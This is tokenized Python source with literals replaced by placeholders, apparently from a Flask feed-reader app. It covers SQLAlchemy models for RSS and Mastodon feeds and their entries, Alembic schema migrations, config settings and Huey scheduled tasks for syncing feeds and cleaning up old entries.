( <EOL> sqlite . insert ( Entry ) . <EOL> values ( ** values ) . <EOL> on_conflict_do_update ( ( "<STR_LIT>" , "<STR_LIT>" ) , set_ = values ) <EOL> ) <EOL> def fetch_entry_data ( self , _force = False ) : <EOL> raise NotImplementedError <EOL> def load_icon ( self ) : <EOL> "<STR_LIT>" <EOL> self . icon_url = scraping . get_favicon ( self . url ) <EOL> @ classmethod <EOL> def frequency_rank_query ( cls ) : <EOL> from flask import current_app as app <EOL> retention_days = app . config [ '<STR_LIT>' ] <EOL> retention_date = datetime . datetime . utcnow ( ) - datetime . timedelta ( days = retention_days ) <EOL> days_since_creation = <NUM_LIT> + sa . func . min ( retention_days , sa . func . round ( <EOL> sa . func . julianday ( '<STR_LIT>' ) - sa . func . julianday ( cls . created ) ) ) <EOL> rank_func = sa . case ( <EOL> ( sa . func . count ( cls . id ) / days_since_creation < <NUM_LIT> / <NUM_LIT> , <NUM_LIT> ) , <EOL> ( sa . func . count ( cls . id ) / days_since_creation < <NUM_LIT> / <NUM_LIT> , <NUM_LIT> ) , <EOL> ( sa . func . count ( cls . id ) / days_since_creation < <NUM_LIT> , <NUM_LIT> ) , <EOL> ( sa . func . count ( cls . id ) / days_since_creation < <NUM_LIT> , <NUM_LIT> ) , <EOL> ( sa . func . count ( cls . id ) / days_since_creation < <NUM_LIT> , <NUM_LIT> ) , <EOL> else_ = <NUM_LIT> <EOL> ) <EOL> return db . select ( cls . id , rank_func . label ( '<STR_LIT>' ) ) . join ( Entry ) . filter ( Entry . sort_date >= retention_date ) . group_by ( cls ) . subquery ( ) <EOL> def frequency_rank ( self ) : <EOL> subquery = self . frequency_rank_query ( ) <EOL> query = db . select ( subquery . c . rank ) . select_from ( Feed ) . join ( subquery , subquery . c . id == self . id ) <EOL> return db . session . scalar ( query ) <EOL> class RssFeed ( Feed ) : <EOL> etag = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> modified_header = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> filters = sa . Column ( sa . String , doc = "<STR_LIT>" ) <EOL> __mapper_args__ = { '<STR_LIT>' : Feed . TYPE_RSS } <EOL> @ classmethod <EOL> def from_valuelist ( cls , _type , name , url , folder , filters ) : <EOL> return cls ( ** dict ( name = name , url = url , folder = folder , filters = filters ) ) <EOL> def to_valuelist ( self ) : <EOL> return [ self . type , self . name , self . url , self . folder , self . filters ] <EOL> def fetch_entry_data ( self , force = False ) : <EOL> from flask import current_app as app <EOL> skip_older_than = datetime . datetime . utcnow ( ) - datetime . timedelta ( days = app . config [ '<STR_LIT>' ] ) <EOL> feed_data , entries , etag , modified = parsers . rss . fetch ( <EOL> self . name , self . url , <EOL> skip_older_than , <EOL> app . config [ '<STR_LIT>' ] , <EOL> None if force else self . last_fetch , <EOL> None if force else self . etag , <EOL> None if force else self . modified_header , <EOL> self . filters ) <EOL> self . etag = etag <EOL> self . modified_header = modified <EOL> if feed_data : <EOL> self . raw_data = json . dumps ( feed_data ) <EOL> return entries <EOL> def load_icon ( self ) : <EOL> self . icon_url = parsers . rss . fetch_icon ( self . url ) <EOL> class MastodonHomeFeed ( Feed ) : <EOL> mastodon_account_id = sa . orm . mapped_column ( sa . ForeignKey ( "<STR_LIT>" ) , nullable = True ) <EOL> account = sa . orm . relationship ( "<STR_LIT>" , lazy = '<STR_LIT>' ) <EOL> @ classmethod <EOL> def from_valuelist ( cls , _type , name , url , folder , access_token ) : <EOL> raise NotImplementedError <EOL> def to_valuelist ( self ) : <EOL> raise NotImplementedError <EOL> def _api_args ( self ) : <EOL> from flask import current_app as app <EOL> latest_entry = self . entries . order_by ( Entry . sort_date . desc ( ) ) . first ( ) <EOL> args = dict ( server_url = self . account . app . api_base_url , <EOL> access_token = self . account . access_token ) <EOL> if latest_entry : <EOL> args [ '<STR_LIT>' ] = latest_entry . remote_id <EOL> else : <EOL> args [ '<STR_LIT>' ] = app . config [ '<STR_LIT>' ] <EOL> return args <EOL> def fetch_entry_data ( self , _force = False ) : <EOL> return parsers . mastodon . fetch_toots ( ** self . _api_args ( ) ) <EOL> def load_icon ( self ) : <EOL> self . icon_url = parsers . mastodon . fetch_account_data ( <EOL> self . account . app . api_base_url , self . account . access_token ) [ '<STR_LIT>' ] <EOL> __mapper_args__ = { '<STR_LIT>' : Feed . TYPE_MASTODON_HOME } <EOL> class MastodonNotificationsFeed ( MastodonHomeFeed ) : <EOL> def fetch_entry_data ( self , _force = False ) : <EOL> return parsers . mastodon . fetch_notifications ( ** self . _api_args ( ) ) <EOL> __mapper_args__ = { '<STR_LIT>' : Feed . TYPE_MASTODON_NOTIFICATIONS } <EOL> class CustomFeed ( Feed ) : <EOL> __mapper_args__ = { '<STR_LIT>' : Feed . TYPE_CUSTOM } <EOL> def fetch_entry_data ( self , _force = False ) : <EOL> return parsers . custom . fetch ( self . name , self . url ) <EOL> class Entry ( db . Model ) : <EOL> "<STR_LIT>" <EOL> ORDER_RECENCY = '<STR_LIT>' <EOL> "<STR_LIT>" <EOL> ORDER_FREQUENCY = '<STR_LIT>' <EOL> __tablename__ = '<STR_LIT>' <EOL> id = sa . Column ( sa . Integer , primary_key = True ) <EOL> feed_id = sa . orm . mapped_column ( sa . ForeignKey ( "<STR_LIT>" ) ) <EOL> user_id = sa . orm . mapped_column ( sa . ForeignKey ( "<STR_LIT>" ) , nullable = False , index = True ) <EOL> feed = sa . orm . relationship ( "<STR_LIT>" , back_populates = "<STR_LIT>" ) <EOL> remote_id = sa . Column ( sa . String , nullable = False , <EOL> doc = "<STR_LIT>" ) <EOL> title = sa . Column ( sa . String ) <EOL> username = sa . Column ( sa . String , index = True ) <EOL> user_url = sa . Column ( sa . String ) <EOL> display_name = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> avatar_url = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> content_short = sa . Column ( sa . String , doc = "<STR_LIT>" ) <EOL> content_full = sa . orm . deferred ( sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) ) <EOL> target_url = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> content_url = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> comments_url = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> media_url = sa . Column ( sa . String , doc = "<STR_LIT>" ) <EOL> created = sa . Column ( sa . TIMESTAMP , nullable = False , default = datetime . datetime . utcnow ) <EOL> updated = sa . Column ( sa . TIMESTAMP , nullable = False , <EOL> default = datetime . datetime . utcnow , onupdate = datetime . datetime . utcnow ) <EOL> display_date = sa . Column ( sa . TIMESTAMP , nullable = False , <EOL> doc = "<STR_LIT>" ) <EOL> sort_date = sa . Column ( sa . TIMESTAMP , nullable = False , <EOL> doc = "<STR_LIT>" ) <EOL> viewed = sa . Column ( sa . TIMESTAMP , index = True ) <EOL> favorited = sa . Column ( sa . TIMESTAMP , index = True ) <EOL> pinned = sa . Column ( sa . TIMESTAMP , index = True ) <EOL> backlogged = sa . Column ( sa . TIMESTAMP , index = True ) <EOL> raw_data = sa . orm . deferred ( sa . Column ( sa . String , <EOL> doc = "<STR_LIT>" ) ) <EOL> header = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> icon_url = sa . Column ( <EOL> sa . String , doc = "<STR_LIT>" ) <EOL> __table_args__ = ( sa . UniqueConstraint ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> sa . Index ( "<STR_LIT>" , sort_date . desc ( ) ) ) <EOL> @ classmethod <EOL> def from_url ( cls , user_id , url ) : <EOL> "<STR_LIT>" <EOL> entry = db . session . scalar ( db . select ( cls ) <EOL> . filter_by ( content_url = url , user_id = user_id ) ) <EOL> if not entry : <EOL> values = parsers . html . fetch ( url ) <EOL> entry = cls ( user_id = user_id , ** values ) <EOL> return entry <EOL> def __repr__ ( self ) : <EOL> return f'<STR_LIT>' <EOL> @ property <EOL> def is_external_link ( self ) : <EOL> if not self . target_url : <EOL> return False <EOL> if not self . feed : <EOL> return True <EOL> if not self . feed . url : <EOL> return False <EOL> return urllib . parse . urlparse ( self . target_url ) . netloc != urllib . parse . urlparse ( self . feed . url ) <EOL> @ property <EOL> def has_distinct_user ( self ) : <EOL> return self . avatar_url and ( self . display_name or self . username ) <EOL> def fetch_content ( self ) : <EOL> if self . content_url and not self . content_full : <EOL> try : <EOL> self . content_full = scraping . extract ( self . content_url ) [ '<STR_LIT>' ] <EOL> except Exception as e : <EOL> logger . debug ( "<STR_LIT>" , e ) <EOL> def embedded_links ( self ) : <EOL> "<STR_LIT>" <EOL> if self . content_short : <EOL> return [ url for ( url , text ) in scraping . extract_links ( self . target_url , self . content_short ) <EOL> if not text . startswith ( '<STR_LIT>' ) and not text . startswith ( '<STR_LIT>' ) ] <EOL> return [ ] <EOL> def is_unwrappable ( self ) : <EOL> "<STR_LIT>" <EOL> return bool ( self . embedded_links ( ) ) <EOL> def backlog ( self ) : <EOL> "<STR_LIT>" <EOL> self . backlogged = datetime . datetime . utcnow ( ) <EOL> self . pinned = None <EOL> def unbacklog ( self ) : <EOL> "<STR_LIT>" <EOL> self . backlogged = None <EOL> self . viewed = None <EOL> self . sort_date = datetime . datetime . utcnow ( ) <EOL> self . fetch_content ( ) <EOL> @ classmethod <EOL> def _filtered_query ( cls , user_id , hide_seen = False , favorited = None , backlogged = None , <EOL> feed_name = None , username = None , folder = None , older_than = None , <EOL> text = None ) : <EOL> query = db . select ( cls ) . filter_by ( user_id = user_id ) <EOL> if older_than : <EOL> query = query . filter ( cls . created < older_than ) <EOL> if hide_seen : <EOL> query = query . filter ( cls . viewed . is_ ( None ) | <EOL> ( cls . viewed . isnot ( None ) & ( cls . viewed > older_than ) ) ) <EOL> if favorited : <EOL> query = query . filter ( cls . favorited . is_not ( None ) ) <EOL> if backlogged : <EOL> query = query . filter ( cls . backlogged . is_not ( None ) ) <EOL> elif hide_seen : <EOL> query = query . filter ( cls . backlogged . is_ ( None ) ) <EOL> if feed_name : <EOL> query = query . filter ( cls . feed . has ( name = feed_name ) ) <EOL> if folder : <EOL> query = query . filter ( cls . feed . has ( folder = folder ) ) <EOL> if username : <EOL> query = query . filter ( cls . username == username ) <EOL> if text : <EOL> query = query . filter ( cls . title . contains ( text ) | <EOL> cls . username . contains ( text ) | <EOL> cls . content_short . contains ( text ) | <EOL> cls . content_full . contains ( text ) ) <EOL> return query <EOL> @ classmethod <EOL> def select_pinned ( cls , user_id , ** kwargs ) : <EOL> "<STR_LIT>" <EOL> query = cls . _filtered_query ( user_id , ** kwargs ) . filter ( cls . pinned . is_not ( None ) ) . order_by ( cls . pinned . desc ( ) ) <EOL> return db . session . scalars ( query ) . all ( ) <EOL> @ classmethod <EOL> def sorted_by ( cls , user_id , ordering , start_at , ** filters ) : <EOL> query = cls . _filtered_query ( user_id , older_than = start_at , ** filters ) <EOL> if filters . get ( '<STR_LIT>' ) : <EOL> return query . order_by ( cls . favorited . desc ( ) ) <EOL> if filters . get ( '<STR_LIT>' ) : <EOL> return query . order_by ( cls . backlogged ) <EOL> elif ordering == cls . ORDER_RECENCY : <EOL> return query . order_by ( cls . sort_date . desc ( ) ) <EOL> elif ordering == cls . ORDER_FREQUENCY : <EOL> subquery = Feed . frequency_rank_query ( ) <EOL> recency_bucket_date = datetime . datetime . utcnow ( ) - datetime . timedelta ( hours = <NUM_LIT> ) <EOL> return query . join ( Feed , isouter = True ) . join ( subquery , Feed . id == subquery . c . id , isouter = True ) . order_by ( <EOL> ( cls . sort_date >= recency_bucket_date ) . desc ( ) , <EOL> subquery . c . rank , <EOL> cls . sort_date . desc ( ) ) <EOL> else : <EOL> raise ValueError ( '<STR_LIT>' % ordering ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . create_index ( op . f ( '<STR_LIT>' ) , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> op . create_index ( op . f ( '<STR_LIT>' ) , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> op . create_index ( op . f ( '<STR_LIT>' ) , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = True ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_index ( op . f ( '<STR_LIT>' ) , table_name = '<STR_LIT>' ) <EOL> op . drop_index ( op . f ( '<STR_LIT>' ) , table_name = '<STR_LIT>' ) <EOL> op . drop_index ( op . f ( '<STR_LIT>' ) , table_name = '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . Integer ( ) , nullable = False , server_default = "<STR_LIT>" ) ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . TIMESTAMP ( ) , nullable = True , server_default = None ) ) <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . TIMESTAMP ( ) , nullable = True , server_default = None ) ) <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . TIMESTAMP ( ) , nullable = True , server_default = None ) ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . String ( ) , nullable = True ) ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = None <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . String ( ) , nullable = True ) ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . TIMESTAMP ( ) , nullable = True ) ) <EOL> op . create_index ( op . f ( '<STR_LIT>' ) , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_index ( op . f ( '<STR_LIT>' ) , table_name = '<STR_LIT>' ) <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , <EOL> existing_type = sa . INTEGER ( ) , <EOL> nullable = False ) <EOL> batch_op . drop_index ( '<STR_LIT>' ) <EOL> batch_op . create_index ( '<STR_LIT>' , [ '<STR_LIT>' , '<STR_LIT>' ] , unique = False ) <EOL> batch_op . create_unique_constraint ( '<STR_LIT>' , [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_constraint ( '<STR_LIT>' , type_ = '<STR_LIT>' ) <EOL> batch_op . drop_index ( '<STR_LIT>' ) <EOL> batch_op . create_index ( '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> batch_op . alter_column ( '<STR_LIT>' , <EOL> existing_type = sa . INTEGER ( ) , <EOL> nullable = True ) <EOL> </s>
<s> SQLALCHEMY_DATABASE_URI = "<STR_LIT>" <EOL> ENTRY_PAGE_SIZE = <NUM_LIT> <EOL> SYNC_FEEDS_CRON_MINUTES = '<STR_LIT>' <EOL> DELETE_OLD_CRON_HOURS = '<STR_LIT>' <EOL> SKIP_RECENTLY_UPDATED_MINUTES = <NUM_LIT> <EOL> CONTENT_PREFETCH_MINUTES = '<STR_LIT>' <EOL> RSS_SKIP_OLDER_THAN_DAYS = <NUM_LIT> <EOL> DELETE_AFTER_DAYS = <NUM_LIT> <EOL> RSS_MINIMUM_ENTRY_AMOUNT = <NUM_LIT> <EOL> MASTODON_FETCH_LIMIT = <NUM_LIT> <EOL> HUEY_POOL_SIZE = <NUM_LIT> <EOL> DEFAULT_AUTH_USER = '<STR_LIT>' <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . Integer ( ) , nullable = True ) ) <EOL> batch_op . create_index ( batch_op . f ( '<STR_LIT>' ) , [ '<STR_LIT>' ] , unique = False ) <EOL> batch_op . create_foreign_key ( '<STR_LIT>' , '<STR_LIT>' , [ '<STR_LIT>' ] , [ '<STR_LIT>' ] ) <EOL> op . execute ( <EOL> '<STR_LIT>' ) <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , nullable = False ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_constraint ( '<STR_LIT>' , type_ = '<STR_LIT>' ) <EOL> batch_op . drop_index ( batch_op . f ( '<STR_LIT>' ) ) <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . alter_column ( '<STR_LIT>' , '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> op . alter_column ( '<STR_LIT>' , '<STR_LIT>' , new_column_name = '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> from alembic import op <EOL> import sqlalchemy as sa <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . create_index ( op . f ( '<STR_LIT>' ) , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> op . create_index ( op . f ( '<STR_LIT>' ) , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> op . create_index ( op . f ( '<STR_LIT>' ) , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_index ( op . f ( '<STR_LIT>' ) , table_name = '<STR_LIT>' ) <EOL> op . drop_index ( op . f ( '<STR_LIT>' ) , table_name = '<STR_LIT>' ) <EOL> op . drop_index ( op . f ( '<STR_LIT>' ) , table_name = '<STR_LIT>' ) <EOL> </s>
<s> ENV = '<STR_LIT>' <EOL> SECRET_KEY = b'<STR_LIT>' <EOL> TESTING = True <EOL> SQLALCHEMY_DATABASE_URI = "<STR_LIT>" <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . drop_index ( '<STR_LIT>' , table_name = '<STR_LIT>' ) <EOL> with op . batch_alter_table ( "<STR_LIT>" ) as batch_op : <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> def downgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . TIMESTAMP ( ) , nullable = True ) ) <EOL> op . create_index ( '<STR_LIT>' , '<STR_LIT>' , [ '<STR_LIT>' ] , unique = False ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> op . add_column ( '<STR_LIT>' , sa . Column ( '<STR_LIT>' , sa . Integer ( ) , nullable = True , server_default = "<STR_LIT>" ) ) <EOL> def downgrade ( ) -> None : <EOL> op . drop_column ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . add_column ( sa . Column ( '<STR_LIT>' , sa . Integer ( ) , nullable = False , server_default = '<STR_LIT>' ) ) <EOL> batch_op . create_index ( batch_op . f ( '<STR_LIT>' ) , [ '<STR_LIT>' ] , unique = False ) <EOL> batch_op . create_foreign_key ( '<STR_LIT>' , '<STR_LIT>' , [ '<STR_LIT>' ] , [ '<STR_LIT>' ] ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' , schema = None ) as batch_op : <EOL> batch_op . drop_constraint ( '<STR_LIT>' , type_ = '<STR_LIT>' ) <EOL> batch_op . drop_index ( batch_op . f ( '<STR_LIT>' ) ) <EOL> batch_op . drop_column ( '<STR_LIT>' ) <EOL> </s>
<s> from typing import Sequence , Union <EOL> import sqlalchemy as sa <EOL> from alembic import op <EOL> revision : str = '<STR_LIT>' <EOL> down_revision : Union [ str , None ] = '<STR_LIT>' <EOL> branch_labels : Union [ str , Sequence [ str ] , None ] = None <EOL> depends_on : Union [ str , Sequence [ str ] , None ] = None <EOL> def upgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , <EOL> existing_type = sa . String ( ) , <EOL> nullable = False ) <EOL> def downgrade ( ) -> None : <EOL> with op . batch_alter_table ( '<STR_LIT>' ) as batch_op : <EOL> batch_op . alter_column ( '<STR_LIT>' , <EOL> existing_type = sa . String ( ) , <EOL> nullable = True ) <EOL> </s>
<s> import csv <EOL> import datetime <EOL> from functools import wraps <EOL> import click <EOL> import flask <EOL> import opml <EOL> import sqlalchemy as sa <EOL> from huey import crontab <EOL> from huey . contrib . mini import MiniHuey <EOL> import feedi . models as models <EOL> import feedi . parsers as parsers <EOL> from feedi . app import create_huey_app <EOL> from feedi . models import db <EOL> app = create_huey_app ( ) <EOL> huey = MiniHuey ( pool_size = app . config [ '<STR_LIT>' ] ) <EOL> feed_cli = flask . cli . AppGroup ( '<STR_LIT>' ) <EOL> user_cli = flask . cli . AppGroup ( '<STR_LIT>' ) <EOL> flask . current_app . cli . add_command ( feed_cli ) <EOL> flask . current_app . cli . add_command ( user_cli ) <EOL> def huey_task ( * huey_args ) : <EOL> "<STR_LIT>" <EOL> huey_decorator = huey . task ( * huey_args ) <EOL> def with_context ( f ) : <EOL> @ wraps ( f ) <EOL> def decorator ( * args , ** kwargs ) : <EOL> with app . app_context ( ) : <EOL> fargs = '<STR_LIT>' . join ( [ str ( arg ) for arg in args ] ) <EOL> fkwargs = '<STR_LIT>' . join ( [ f'<STR_LIT>' for ( k , v ) in kwargs . items ( ) ] ) <EOL> app . logger . info ( "<STR_LIT>" , f . __name__ , fargs , fkwargs ) <EOL> try : <EOL> f ( * args , ** kwargs ) <EOL> app . logger . info ( "<STR_LIT>" , f . __name__ , fargs , fkwargs ) <EOL> except Exception : <EOL> app . logger . exception ( "<STR_LIT>" , f . __name__ , fargs , fkwargs ) <EOL> return decorator <EOL> def composed_decorator ( f ) : <EOL> return huey_decorator ( with_context ( f ) ) <EOL> return composed_decorator <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ huey_task ( crontab ( minute = app . config [ '<STR_LIT>' ] ) ) <EOL> def sync_all_feeds ( ) : <EOL> feeds = db . session . execute ( db . select ( models . Feed . id , models . Feed . name ) ) . all ( ) <EOL> tasks = [ ] <EOL> for feed in feeds : <EOL> tasks . append ( ( feed . name , sync_feed ( feed . id , feed . name ) ) ) <EOL> for name , task in tasks : <EOL> try : <EOL> task . get ( ) <EOL> except Exception : <EOL> app . logger . exception ( "<STR_LIT>" , name ) <EOL> continue <EOL> @ huey_task ( ) <EOL> def sync_feed ( feed_id , _feed_name , force = False ) : <EOL> db_feed = db . session . get ( models . Feed , feed_id ) <EOL> db_feed . sync_with_remote ( force = force ) <EOL> db . session . commit ( ) <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ huey_task ( crontab ( minute = app . config [ '<STR_LIT>' ] ) ) <EOL> def content_prefetch ( ) : <EOL> for user_id in db . session . scalars ( db . select ( models . User . id ) ) : <EOL> start_at = datetime . datetime . utcnow ( ) <EOL> query = models . Entry . sorted_by ( <EOL> user_id , models . Entry . ORDER_FREQUENCY , start_at , hide_seen = True ) . filter ( models . Entry . content_full . is_ ( None ) , models . Entry . content_url . isnot ( None ) ) . limit ( <NUM_LIT> ) <EOL> for entry in db . session . scalars ( query ) : <EOL> app . logger . debug ( '<STR_LIT>' , entry . content_url ) <EOL> entry . fetch_content ( ) <EOL> db . session . commit ( ) <EOL> @ feed_cli . command ( '<STR_LIT>' ) <EOL> @ huey_task ( crontab ( minute = '<STR_LIT>' , hour = app . config [ '<STR_LIT>' ] ) ) <EOL> def delete_old_entries ( ) : <EOL> older_than_date = ( datetime . datetime . utcnow ( ) - <EOL> datetime . timedelta ( days = app . config [ '<STR_LIT>' ] ) ) <EOL> minimum = app . config [ '<STR_LIT>' ] <EOL> feeds_q = db . select ( models . Feed . id , models . Feed . name ) . join ( models . Feed . entries ) . filter ( models . Entry . sort_date < older_than_date , <EOL> models . Entry . favorited . is_ ( None ) , <EOL> models . Entry . backlogged . is_ ( None ) , <EOL> models . Entry . pinned . is_ ( None ) <EOL> ) . group_by ( models . Feed . id ) . having ( sa . 